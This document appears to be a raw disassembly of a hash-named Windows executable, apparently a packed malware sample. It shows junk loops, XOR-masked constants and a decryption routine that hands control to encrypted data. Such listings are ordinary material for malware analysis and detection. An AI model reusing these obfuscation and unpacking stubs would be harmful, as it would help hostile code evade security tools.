
eac79372c7d2f2bde6c29010a69bb9b619ea150799208ef64deed568f1433766.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	mov    al,0x78
  4018d9:	dec    ebp
  4018da:	fadd   DWORD PTR [ebx+0x4b838383]
  4018e0:	pop    esi
  4018e1:	add    DWORD PTR [ebx+0x3c263128],0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	xchg   edx,eax
  4018f0:	jo     0x401962
  4018f2:	jae    0x401964
  4018f4:	dec    ebx
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	sbb    al,0x5b
  401988:	xchg   ecx,eax
  401989:	ret    
  40198a:	ficom  DWORD PTR [eax+ecx*4+0xd44ecc3]
  401991:	shl    DWORD PTR [edx-0x59004020],1
  401997:	dec    ebp
  401998:	mov    esp,0x7a38b60f
  40199d:	push   ebp
  40199e:	lods   al,BYTE PTR ds:[esi]
  40199f:	xchg   BYTE PTR ds:0x6d62766b,dh
  4019a5:	dec    esp
  4019a6:	mul    BYTE PTR [eax-0x7b47ac57]
  4019ac:	add    BYTE PTR [edi],bl
  4019ae:	out    0xc,al
  4019b0:	repz mov edi,0x72ab1aa1
  4019b6:	xor    al,0x21
  4019b8:	mov    eax,0x48943a5f
  4019bd:	call   0x2bd0:0xf95e0644
  4019c4:	pusha  
  4019c5:	jae    0x401a25
  4019c7:	xchg   ecx,eax
  4019c8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4019ca:	push   esp
  4019cb:	add    ecx,ecx
  4019cd:	int3   
  4019ce:	mov    eax,ds:0x71cc8f98
  4019d3:	jecxz  0x4019fc
  4019d5:	mov    bl,0x2a
  4019d7:	mov    ?,eax
  4019d9:	call   0x394a78b4
  4019de:	pop    es
  4019df:	push   esp
  4019e0:	fild   DWORD PTR [ebx+0x58213ba2]
  4019e6:	mov    edi,DWORD PTR [edi-0x2ac9ff7f]
  4019ec:	stos   DWORD PTR es:[edi],eax
  4019ed:	inc    edi
  4019ee:	repnz (bad) 
  4019f0:	ficomp DWORD PTR [esi+eiz*2]
  4019f3:	ror    eax,1
  4019f5:	loopne 0x401a26
  4019f7:	cwde   
  4019f8:	fidiv  WORD PTR ds:[eax+0x37]
  4019fc:	jmp    0x3add4c7c
  401a01:	add    eax,0xcf990a6e
  401a06:	jnp    0x401a11
  401a08:	xor    edx,ecx
  401a0a:	mov    edx,0x9f2fc64b
  401a0f:	out    dx,al
  401a10:	or     BYTE PTR ds:0x3a1f0351,ch
  401a16:	mov    cl,0x2f
  401a18:	inc    eax
  401a19:	in     eax,dx
  401a1a:	lds    ecx,FWORD PTR [eax]
  401a1c:	sub    DWORD PTR [eax],esp
  401a1e:	sub    bh,BYTE PTR [eax+0x3e]
  401a21:	push   ss
  401a22:	sbb    BYTE PTR [esi-0x3f255d92],0x97
  401a29:	(bad)  
  401a2a:	in     eax,dx
  401a2b:	repnz (bad) [ecx]
  401a2e:	add    bh,BYTE PTR [esi]
  401a30:	and    al,0x49
  401a32:	popf   
  401a33:	aas    
  401a34:	loopne 0x4019c5
  401a36:	mov    ds:0x95fa25c4,al
  401a3b:	inc    esi
  401a3c:	je     0x4019f5
  401a3e:	cmp    dl,ah
  401a40:	cwde   
  401a41:	mov    ebp,0x65ffec12
  401a46:	pusha  
  401a47:	xor    eax,eax
  401a49:	into   
  401a4a:	inc    ebp
  401a4b:	push   ebp
  401a4c:	pop    esp
  401a4d:	cmc    
  401a4e:	(bad)  
  401a4f:	sbb    eax,0xa06320cf
  401a54:	lods   al,BYTE PTR ds:[esi]
  401a55:	and    al,0xd4
  401a57:	mov    BYTE PTR [edx],cl
  401a59:	out    dx,al
  401a5a:	imul   ecx,DWORD PTR [esi],0xffffff9f
  401a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a5e:	mov    al,ds:0x83565662
  401a63:	test   BYTE PTR [ecx+eax*1-0x58],0x57
  401a68:	cmp    DWORD PTR [edx],eax
  401a6a:	inc    edx
  401a6b:	cmp    al,0x62
  401a6d:	and    eax,0x3674bcd5
  401a72:	ins    BYTE PTR es:[edi],dx
  401a73:	pop    ecx
  401a74:	imul   esi,DWORD PTR [esp+esi*8],0xffffffe4
  401a78:	dec    edi
  401a79:	mov    esi,0xe8f380db
  401a7e:	jne    0x401ac4
  401a80:	pusha  
  401a81:	fld    QWORD PTR [eax]
  401a83:	js     0x401a7a
  401a85:	test   eax,0xbef064db
  401a8a:	add    eax,0x79b4097e
  401a8f:	mov    eax,0x4b1b44b1
  401a94:	adc    eax,0x17e0d878
  401a99:	xchg   DWORD PTR [ecx],esi
  401a9b:	add    BYTE PTR ds:0xc97de209,0x7e
  401aa2:	aad    0xf9
  401aa4:	popf   
  401aa5:	sub    DWORD PTR [esp+edx*8+0x21],eax
  401aa9:	test   eax,0x322f1877
  401aae:	mov    bl,0x11
  401ab0:	mov    al,0xd8
  401ab2:	inc    ebp
  401ab3:	sub    DWORD PTR [edi-0x43],ebx
  401ab6:	cwde   
  401ab7:	stos   BYTE PTR es:[edi],al
  401ab8:	xlat   BYTE PTR ds:[ebx]
  401ab9:	or     DWORD PTR [ecx-0x7a],eax
  401abc:	pop    ecx
  401abd:	mov    ah,0x65
  401abf:	cmp    edx,DWORD PTR [esi+edx*1-0x6149ead3]
  401ac6:	cli    
  401ac7:	mov    edx,0xeec76ef
  401acc:	mov    ah,BYTE PTR ds:0xd03d1967
  401ad2:	pop    edx
  401ad3:	cld    
  401ad4:	push   es
  401ad5:	dec    ebp
  401ad6:	sub    DWORD PTR [edi+0x3abf50b9],ecx
  401adc:	inc    ecx
  401add:	add    ebp,edi
  401adf:	xor    al,0xac
  401ae1:	pop    es
  401ae2:	cld    
  401ae3:	xchg   edx,eax
  401ae4:	shl    DWORD PTR [esi+0x10],1
  401ae7:	xor    bl,BYTE PTR [ecx+0x20]
  401aea:	in     al,0xf
  401aec:	and    DWORD PTR [ecx+0x63],esp
  401aef:	jns    0x401ae9
  401af1:	and    al,0x40
  401af3:	lock shl DWORD PTR [eax],cl
  401af6:	into   
  401af7:	pop    es
  401af8:	dec    edi
  401af9:	sub    eax,0x9ab0c561
  401afe:	inc    ecx
  401aff:	sub    bh,bl
  401b01:	(bad)  
  401b02:	mov    al,BYTE PTR [eax+0x52d48489]
  401b08:	mov    ebx,0x3586e9b0
  401b0d:	add    eax,0x6262d50c
  401b12:	fdiv   QWORD PTR [ebx+0x45]
  401b15:	adc    esi,DWORD PTR [ecx+eiz*2-0x42736616]
  401b1c:	test   DWORD PTR [ebx-0x57],ecx
  401b1f:	not    DWORD PTR [edx-0x2eb38c83]
